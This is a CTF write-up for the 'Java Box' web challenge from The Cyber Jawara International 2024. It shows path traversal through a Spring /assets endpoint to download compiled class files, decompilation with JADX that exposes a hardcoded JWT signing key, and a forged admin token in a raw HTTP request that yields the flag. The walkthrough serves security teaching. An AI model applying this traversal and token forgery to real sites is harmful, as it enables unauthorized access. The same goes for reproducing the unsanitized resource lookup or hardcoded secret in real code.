---
title: "Java Box - The Cyber Jawara International 2024"
category: "web"
subcategory: "lfi"
type: "writeup"
tags: ["web", "path-traversal", "jwt", "jadx", "java", "box", "lfi", "the-cyber-jawara-international", "the-cyber-jawara-international-202", "2024", "ctf-writeup"]
summary: "Given a pretty straight forward website, where user can register and login."
source:
  name: "CTFtime writeup #39630"
  url: "https://ctftime.org/writeup/39630"
ctf:
  name: "The Cyber Jawara International 2024"
  year: 2024
  challenge: "Java Box"
---

## Metadata

- **CTF:** The Cyber Jawara International 2024
- **Task:** Java Box
- **Author team:** TCP1P x SNI x MAGER
- **CTFtime:** <https://ctftime.org/writeup/39630>

---
# Challenge Write-Up: [Challenge Name]

\- **Category**: Web  
\- **Author**: farisv

\---

## Challenge Description

> I used to hate black box web challenges in CTFs, but then I remembered, my day job as a pentester also requires black box testing. Sometimes, what seems like a black box isn’t so black after all. http://68.183.177.211:20001/

\---

## Solution  
Given a pretty straight forward website, where user can register and login. But nothing much on login.

But if we visit the http://68.183.177.211:20001/assets the stack trace error are shown.

```java  
java.lang.Exception: getResourceAsStream failed  
at com.cyberjawara.chall.web.javabox.controller.MainController.getAssetFile(MainController.java:95)  
at jdk.internal.reflect.GeneratedMethodAccessor3.invoke(Unknown Source)  
at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)  
...  
```

"Based on the stack trace error, the application uses the getResourceAsStream function to retrieve asset files. We found that the application is vulnerable to arbitrary file read via path traversal. However, it can only traverse up one directory level. For example, if we visit certain URLs, it will display dashboard.html, which the application uses when accessing /dashboard. To obtain the flag, admin access is required, meaning the isAdmin attribute in the JWT token must be set to true."

http://68.183.177.211:20001/assets/../templates/dashboard.html

Based on the hint, we found out that the application java script is also located on the same location as the templates directory. So we just need to access the MainController from the path showns by the stack trace.

http://68.183.177.211:20001/assets/../com/cyberjawara/chall/web/javabox/controller/MainController.class

Using JADX we can decompile the binary class compiled Java and get the following Java code

```java  
package com.cyberjawara.chall.web.javabox.controller;

import com.cyberjawara.chall.web.javabox.util.JwtUtil;  
import io.jsonwebtoken.Claims;  
import jakarta.servlet.http.Cookie;  
import jakarta.servlet.http.HttpServletRequest;  
import jakarta.servlet.http.HttpServletResponse;  
import java.io.BufferedReader;  
import java.io.FileReader;  
import java.io.IOException;  
import java.io.InputStream;  
import java.nio.file.Files;  
import java.nio.file.Path;  
import org.springframework.http.HttpHeaders;  
import org.springframework.http.HttpStatus;  
import org.springframework.http.MediaType;  
import org.springframework.http.ResponseEntity;  
import org.springframework.stereotype.Controller;  
import org.springframework.ui.Model;  
import org.springframework.web.bind.annotation.CookieValue;  
import org.springframework.web.bind.annotation.GetMapping;  
import org.springframework.web.bind.annotation.PostMapping;  
import org.springframework.web.bind.annotation.RequestParam;

@Controller  
/* loaded from: f (1).txt */  
public class MainController {  
@GetMapping({"/"})  
public String index() {  
return "index";  
}

@GetMapping({"/register"})  
public String registerPage() {  
return "register";  
}

@PostMapping({"/register"})  
public String register(@RequestParam String username, @RequestParam String password, HttpServletResponse response) {  
if (username != null && password != null && username.length() > 3 && password.length() > 3) {  
String jwt = JwtUtil.generateToken(username, false);  
Cookie cookie = new Cookie("jwt", jwt);  
cookie.setHttpOnly(true);  
cookie.setPath("/");  
response.addCookie(cookie);  
return "redirect:/dashboard";  
}  
return "redirect:/register";  
}

@GetMapping({"/dashboard"})  
public String dashboard(@CookieValue(value = "jwt", defaultValue = "") String jwt, Model model) {  
try {  
Claims claims = JwtUtil.validateToken(jwt);  
String username = (String) claims.get("username", String.class);  
Boolean isAdmin = (Boolean) claims.get("isAdmin", Boolean.class);  
if (isAdmin.booleanValue()) {  
try {  
BufferedReader br = new BufferedReader(new FileReader("/flag.txt"));  
try {  
String content = br.readLine();  
model.addAttribute("flag", content);  
br.close();  
} catch (Throwable th) {  
try {  
br.close();  
} catch (Throwable th2) {  
th.addSuppressed(th2);  
}  
throw th;  
}  
} catch (IOException e) {  
}  
}  
model.addAttribute("username", username);  
model.addAttribute("isAdmin", isAdmin);  
return "dashboard";  
} catch (Exception e2) {  
return "redirect:/register";  
}  
}

@GetMapping({"/logout"})  
public String logout(HttpServletResponse response) {  
Cookie jwtCookie = new Cookie("jwt", "");  
jwtCookie.setMaxAge(0);  
jwtCookie.setPath("/");  
jwtCookie.setHttpOnly(true);  
response.addCookie(jwtCookie);  
return "redirect:/";  
}

@GetMapping({"/assets/**"})  
public ResponseEntity<byte[]> getAssetFile(HttpServletRequest request) throws Exception {  
String requestURI = request.getRequestURI();  
String resourcePath = "/assets/" + requestURI.substring("/assets/".length());  
try {  
InputStream inputStream = getClass().getResourceAsStream(resourcePath);  
if (inputStream != null) {  
try {  
if (hasExtension(resourcePath)) {  
byte[] fileContent = inputStream.readAllBytes();  
String mimeType = Files.probeContentType(Path.of(resourcePath, new String[0]));  
if (mimeType == null) {  
if (resourcePath.endsWith(".css")) {  
mimeType = "text/css";  
} else {  
mimeType = "text/plain";  
}  
}  
HttpHeaders headers = new HttpHeaders();  
headers.setContentType(MediaType.parseMediaType(mimeType));  
ResponseEntity<byte[]> responseEntity = new ResponseEntity<>(fileContent, headers, HttpStatus.OK);  
if (inputStream != null) {  
inputStream.close();  
}  
return responseEntity;  
}  
} finally {  
}  
}  
throw new Exception("getResourceAsStream failed");  
} catch (IOException e) {  
return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body((Object) null);  
}  
}

public static boolean hasExtension(String filename) {  
int dotIndex;  
return filename != null && !filename.isEmpty() && filename.length() >= 3 && (dotIndex = filename.lastIndexOf(46)) > 0 && dotIndex < filename.length() - 2;  
}  
}  
```

Then we can download the JwtUtl.class at http://68.183.177.211:20001/assets/../com/cyberjawara/chall/web/javabox/util/JwtUtil.class and get the secret used to sign the JWT token by the application

```java  
package com.cyberjawara.chall.web.javabox.util;

import io.jsonwebtoken.Claims;  
import io.jsonwebtoken.Jwts;  
import io.jsonwebtoken.SignatureAlgorithm;  
import java.util.Date;  
import java.util.Map;

/* loaded from: f.txt */  
public class JwtUtil {  
private static final String SECRET_KEY = "c31bcd4ffcff8e971a6ad6ddcbdc613a1246f4223c00fa37404b501ad749257c";

public static String generateToken(String username, boolean isAdmin) {  
return Jwts.builder().setClaims(Map.of("username", username, "isAdmin", Boolean.valueOf(isAdmin))).setExpiration(new Date(System.currentTimeMillis() + 3600000)).signWith(SignatureAlgorithm.HS256, SECRET_KEY).compact();  
}

public static Claims validateToken(String token) {  
return (Claims) Jwts.parser().setSigningKey(SECRET_KEY).parseClaimsJws(token).getBody();  
}  
}  
```

Using the JWT Code with isAdmin value true will shows the flag if we access /dashboard  
```  
GET /dashboard HTTP/1.1  
Host: 68.183.177.211:20001  
Accept-Language: en-US,en;q=0.9  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36  
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8Referer: http://68.183.177.211:20001/dashboard  
Accept-Encoding: gzip, deflate, br  
Cookie: jwt=eyJhbGciOiJIUzI1NiJ9.eyJpc0FkbWluIjp0cnVlLCJleHAiOjE3MzAwMjQ3OTcsInVzZXJuYW1lIjoidXNlcjEyMyJ9.TPCpnJGno1IChXlpqO09SbvLWMRjF6xChIHCbWVICjY  
Connection: keep-alive

```

```html

<html lang="en">  
<head>  
<meta charset="UTF-8">  
<meta name="viewport" content="width=device-width, initial-scale=1.0">  
<title>Dashboard</title>  
<link rel="stylesheet" href="/assets/style.css">  
</head>  
<body>  
<div class="container">  
<h2>Welcome, <span>user123</span>!</h2>  


You are logged in as: <span>Admin (CJ{black_box_web_testing_is_not_that_bad_and_too_guessy_right?})</span>

  
![](https://ctftime.org/assets/box.jpg)  
[Logout](https://ctftime.org/logout)  
</div>  
</body>  
</html>  
``` 

### Flag  
CJ{black_box_web_testing_is_not_that_bad_and_too_guessy_right?}
